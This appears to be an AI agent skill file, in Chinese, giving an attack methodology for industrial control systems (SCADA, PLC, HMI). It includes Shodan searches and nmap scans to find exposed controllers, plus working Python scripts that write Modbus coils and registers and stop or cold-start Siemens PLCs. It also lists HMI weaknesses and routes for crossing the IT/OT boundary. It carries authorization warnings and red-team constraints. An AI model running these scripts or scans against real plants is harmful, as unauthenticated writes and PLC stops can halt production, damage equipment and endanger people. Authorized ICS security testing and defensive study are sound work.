---
name: ot-ics-attack
description: "OT/ICS 工控系统攻击方法论。当目标涉及 SCADA/DCS/PLC 系统、发现 Modbus/DNP3/OPC UA/EtherNet-IP 等工控协议、或需要评估关键基础设施安全时使用。覆盖工控协议利用、PLC 攻击、HMI 渗透、IT/OT 边界突破"
metadata:
  tags: "ot,ics,scada,plc,modbus,dnp3,opc-ua,hmi,工控,工业控制,关键基础设施"
  category: "exploit"
  mitre_attack: "T0800,T0801,T0802,T0803,T0831,T0855"
---

# OT/ICS 工控系统攻击方法论

> **⛔ 安全警告**：OT 系统控制物理过程，错误操作可能导致设备损坏、环境灾难或人身伤害。仅在明确授权和安全隔离环境下测试！

## ⛔ 深入参考

- 工控协议利用详细 payload → [references/ics-protocol-exploit.md](references/ics-protocol-exploit.md)
- PLC 攻击与固件分析 → [references/plc-attack.md](references/plc-attack.md)

---

## Phase 0: OT 环境理解

### Purdue 模型（网络分层）

```
Level 5: Enterprise Network (IT)
Level 4: Business Planning (ERP/MES)
━━━━━━━━━━━ DMZ / IT-OT 边界 ━━━━━━━━━━━
Level 3: Site Operations (Historian/SCADA Server)
Level 2: Area Control (HMI/Engineering WS)
Level 1: Basic Control (PLC/RTU/DCS)
Level 0: Physical Process (传感器/执行器)

攻击路径通常: Level 5 → 4 → DMZ → 3 → 2 → 1 → 0
关键突破点: IT/OT 边界（DMZ 配置错误）
```

### 常见工控协议

| 协议 | 端口 | 认证 | 用途 |
|------|------|------|------|
| Modbus TCP | 502 | ⛔ 无 | PLC 读写寄存器 |
| DNP3 | 20000 | 可选 | 电力 SCADA |
| OPC UA | 4840 | 有 | 数据访问 |
| EtherNet/IP | 44818 | ⛔ 无 | Rockwell PLC |
| S7comm | 102 | ⛔ 无 | Siemens PLC |
| BACnet | 47808 | ⛔ 无 | 楼宇自控 |
| FINS | 9600 | ⛔ 无 | Omron PLC |

## Phase 1: 信息收集（被动优先）

```bash
# Shodan 搜索暴露的 ICS 设备
shodan search "port:502 product:Modbus"
shodan search "port:102 product:S7"
shodan search "port:44818 product:EtherNet/IP"
shodan search "port:47808 product:BACnet"

# 目标网络扫描（⛔ 仅在授权后，使用低速率）
nmap -sT -Pn -p 102,502,4840,20000,44818,47808 --scan-delay 500ms TARGET_RANGE

# 被动流量分析（如果有镜像端口）
tcpdump -i eth0 -w ics_traffic.pcap port 502 or port 102 or port 44818

# Wireshark 工控协议解析
# 内置支持: Modbus, DNP3, OPC UA, S7comm, EtherNet/IP
```

## Phase 2: 工控协议利用

### 2.1 Modbus TCP（无认证！）

```python
#!/usr/bin/env python3
"""Modbus TCP 读写操作 — 无需认证"""
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('TARGET_IP', port=502)
client.connect()

# 读取保持寄存器（获取当前值/配置）
result = client.read_holding_registers(address=0, count=10, slave=1)
print(f"Registers: {result.registers}")

# 读取线圈状态（数字输出状态）
result = client.read_coils(address=0, count=10, slave=1)
print(f"Coils: {result.bits}")

# ⛔ 写入操作（改变物理过程！仅在安全环境）
# 写单个寄存器
client.write_register(address=0, value=100, slave=1)

# 写单个线圈（开关控制）
client.write_coil(address=0, value=True, slave=1)  # 开
client.write_coil(address=0, value=False, slave=1) # 关

client.close()
```

### 2.2 Siemens S7comm

```python
#!/usr/bin/env python3
"""S7comm 协议交互 — Siemens S7-300/400/1200/1500"""
import snap7

# 连接 PLC
plc = snap7.client.Client()
plc.connect('TARGET_IP', rack=0, slot=1)  # S7-300: slot=2

# 读取 PLC 信息
info = plc.get_cpu_info()
print(f"Module: {info.ModuleTypeName}")
print(f"Serial: {info.SerialNumber}")

# 读取数据块 (DB)
data = plc.db_read(db_number=1, start=0, size=100)
print(f"DB1 data: {data.hex()}")

# 读取输入/输出
inputs = plc.read_area(snap7.types.Areas.PE, 0, 0, 10)   # 输入
outputs = plc.read_area(snap7.types.Areas.PA, 0, 0, 10)  # 输出

# ⛔ 危险操作（仅安全环境）
# 停止 PLC
plc.plc_stop()
# 启动 PLC
plc.plc_cold_start()

plc.disconnect()
```

### 2.3 EtherNet/IP (Rockwell/Allen-Bradley)

```python
#!/usr/bin/env python3
"""EtherNet/IP CIP 协议 — 无认证"""
from pycomm3 import LogixDriver

with LogixDriver('TARGET_IP') as plc:
    # 读取标签值
    result = plc.read('MyTag')
    print(f"Tag value: {result.value}")

    # 读取多个标签
    results = plc.read('Tag1', 'Tag2', 'Tag3')
    for r in results:
        print(f"{r.tag}: {r.value}")

    # 获取 PLC 信息
    info = plc.get_plc_info()
    print(f"Product: {info['product_name']}")

    # 列出所有标签（信息收集）
    tags = plc.get_tag_list()
    for tag in tags:
        print(f"  {tag['tag_name']}: {tag['data_type_name']}")

    # ⛔ 写入
    # plc.write('MotorSpeed', 1000)
```

## Phase 3: HMI/SCADA 服务器攻击

```
HMI/SCADA 常见漏洞：
├─ 默认凭据（admin/admin, administrator/空）
├─ 未加密通信（Modbus/OPC DA 明文）
├─ Web HMI SQL注入/XSS
├─ VNC 无密码暴露
├─ RDP 弱口令（Level 2/3 工作站）
├─ 过时操作系统（Windows XP/7/2008 仍在用）
└─ 未更新的 SCADA 软件（已知 CVE）

常见 SCADA 软件:
├─ Siemens WinCC → CVE 众多
├─ GE iFix / CIMPLICITY
├─ Schneider ClearSCADA
├─ Wonderware InTouch
├─ Ignition (Inductive Automation)
└─ Kepware KEPServerEX (OPC)
```

## Phase 4: IT/OT 边界突破

```
从 IT 网络进入 OT：
├─ 跳板: Historian 服务器（同时连接 IT 和 OT）
├─ 双网卡工作站（Level 3 操作员电脑）
├─ VPN/远程访问通道（TeamViewer/AnyDesk 在 HMI 上）
├─ 共享文件服务器（IT/OT 共享）
├─ 数据库服务器（MES/ERP 连接到 OT）
└─ 防火墙规则宽松（OT→IT 无限制回连）
```

## Phase 5: 攻击影响评估

```
⛔ OT 攻击的潜在物理影响：
├─ 改变 PLC 逻辑 → 物理过程失控
├─ 修改 HMI 显示 → 操作员看到假数据（Stuxnet 手法）
├─ 停止 PLC → 生产停摆
├─ 修改安全限值 → 越过安全阈值
└─ 同时攻击 SIS(安全仪表系统) + PLC → 最危险

红队测试中的安全约束：
├─ ⛔ NEVER 修改 SIS (Safety Instrumented System)
├─ ⛔ NEVER 在生产系统上测试写入操作
├─ ✓ 仅读取操作验证可达性
├─ ✓ 在独立测试环境中验证写入
└─ ✓ 随时与运维团队保持通信
```

## 工具速查

| 工具 | 用途 |
|------|------|
| pymodbus | Modbus TCP 客户端 |
| python-snap7 | Siemens S7 通信 |
| pycomm3 | EtherNet/IP CIP |
| Wireshark + ICS dissectors | 协议分析 |
| PLCScan | PLC 枚举 |
| ISF (Industrial Exploitation Framework) | ICS 利用框架 |
| GRASSMARLIN | OT 网络拓扑发现 |
| Shodan/Censys | 暴露面发现 |

